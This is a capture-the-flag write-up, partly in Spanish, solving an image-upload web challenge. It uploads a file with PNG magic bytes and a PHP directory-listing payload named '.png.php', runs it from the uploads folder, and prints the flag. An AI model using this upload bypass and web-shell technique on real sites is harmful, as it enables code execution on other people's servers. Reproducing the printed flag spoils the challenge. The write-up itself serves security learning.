## Descripción
I found a web app that can help process images: PNG images only!

[http://atlas.picoctf.net:57981/](http://atlas.picoctf.net:57981/)
## Solución
```
curl -s http://atlas.picoctf.net:57981/robots.txt

User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

Leí instructions.txt:

curl -s http://atlas.picoctf.net:57981/instructions.txt

La app validaba que el archivo tuviera .png en el nombre y que los primeros bytes contuvieran PNG.

PNG
<?php foreach(scandir("/var/www/html") as $f){echo $f."\n";} ?>

curl -s -F "file=@trickster-list.png.php;filename=trickster-list.png.php;type=image/png" http://atlas.picoctf.net:57981/

curl -s http://atlas.picoctf.net:57981/uploads/trickster-list.png.php

GAZWIMLEGU2DQ.txt

curl -s http://atlas.picoctf.net:57981/GAZWIMLEGU2DQ.txt

/* academy{c3rt!fi3d_Xp3rt_tr1ckst3r_b0eea9c8} */

academy{c3rt!fi3d_Xp3rt_tr1ckst3r_b0eea9c8}
```
```

```

## Notas Adicionales
- El filtro era débil porque aceptaba nombres que contenían `.png`, aunque terminaran en `.php`.

## Referencias
-- [http://atlas.picoctf.net:57981/](http://atlas.picoctf.net:57981/)
- [http://atlas.picoctf.net:57981/robots.txt](http://atlas.picoctf.net:57981/robots.txt)
- [http://atlas.picoctf.net:57981/instructions.txt](http://atlas.picoctf.net:57981/instructions.txt)